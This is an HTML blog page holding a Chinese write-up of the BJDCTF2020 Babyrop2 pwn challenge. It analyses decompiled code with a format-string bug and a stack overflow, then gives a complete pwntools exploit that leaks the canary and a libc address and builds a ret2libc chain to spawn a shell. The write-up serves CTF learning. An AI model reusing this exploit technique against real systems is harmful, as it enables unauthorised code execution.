@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mykonos">
+
+
+
+
+
+<title>BJDCTF2020 Babyrop2 | Silence to hear.</title>
+
+
+
+    <link rel="icon" href="/ico.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mykonos-x&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mykonos-x&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">BJDCTF2020 Babyrop2</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mykonos</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 29, 2022&nbsp;&nbsp;11:19:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>最近这段时间应该会陆陆续续补上以前做的pwn题的wp，再来复习一下</p>
+<h3 id="Involved-Knowledge"><a href="#Involved-Knowledge" class="headerlink" title="Involved Knowledge"></a>Involved Knowledge</h3><ul>
+<li>Format String</li>
+<li>Stackoverflow</li>
+<li>ret2libc</li>
+</ul>
+<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>64位，开启了Canary(金丝雀)和NX(堆栈不可执行)，那么如果有canary的话，我们在进行rop时首先就是要泄露canary</p>
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gift();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main函数里面依次执行三个函数<code>init()</code>,<code>gift()</code>,<code>vuln()</code>，依次跟进</p>
+<h4 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can u return to libc ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try u best!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>setvbuf进行了初始化了输入输出流该如何缓冲，将缓冲置零</p>
+<h4 id="gift"><a href="#gift" class="headerlink" title="gift()"></a>gift()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code> __isoc99_scanf(&quot;%6s&quot;, format);  printf(format);</code></p>
+<p>这里有format string，我们可以尝试泄露出canary，通过gdb找到canary的偏移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里是个stackoverflow，buf只有0x18大小，但是read的长度是0x64，我们可以在这里写ropchain</p>
+<p>分析到这里结束</p>
+<p>我们拿到canary后在rop时把canary放到它原来的位置上就行，后面跟上了p64(0)是因为还有8个字节才覆盖到返回地址，然后打ropchain</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line">    <span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line">    <span class="comment"># Stack:    Canary found</span></span><br><span class="line">    <span class="comment"># NX:       NX enabled</span></span><br><span class="line">    <span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span> , arch = <span class="string">&#x27;amd64&#x27;</span> , log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.14.71.254&#x27;</span> , <span class="number">28377</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>) , <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary = &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">ret = <span class="number">0x00000000004005f9</span></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span> , puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;libc_base = &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;system = &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&#x27;bin_sh &#x27;</span> + <span class="built_in">hex</span>(bin_sh))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;I&#x27;ll give u some gift to help u!\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Mykonos</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://mykonos-x.github.io/2022/08/29/BJDCTF2020-Babyrop2/">http://mykonos-x.github.io/2022/08/29/BJDCTF2020-Babyrop2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span><strong>You can go further</strong>.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/write-up/"># write-up</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/08/29/jarvisoj-level3-x64/">jarvisoj_level3_x64</a>
+            
+            
+            <a class="next" rel="next" href="/2022/08/28/%E9%95%BF%E5%9F%8E%E6%9D%AF2022-known-phi/">长城杯2022 known_phi</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mykonos | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
